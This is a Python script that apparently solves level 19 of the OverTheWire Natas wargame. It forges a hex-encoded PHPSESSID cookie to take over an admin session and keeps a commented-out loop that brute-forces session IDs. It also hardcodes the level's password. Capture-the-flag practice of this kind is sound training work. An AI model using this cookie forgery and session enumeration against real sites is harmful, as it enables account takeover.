#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
from string import *
from time import *

characters = lowercase + uppercase + digits

username = 'natas19'
password = '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url,cookies = {"PHPSESSID" : str("%d-admin" % 281).encode('hex')}, auth = (username,password))

print response.text

# for i in range (641):
# 	session = requests.Session()
# 	print {"PHPSESSID" : str("%d.admin" % i).encode('hex')}
# 	response = session.get(url,cookies = {"PHPSESSID" : str("%d-admin" % i).encode('hex')}, auth = (username,password))
# 	content = response.text

# 	if ("You are an admin" in content):
# 		print "Got it", i
# 		print content
# 		break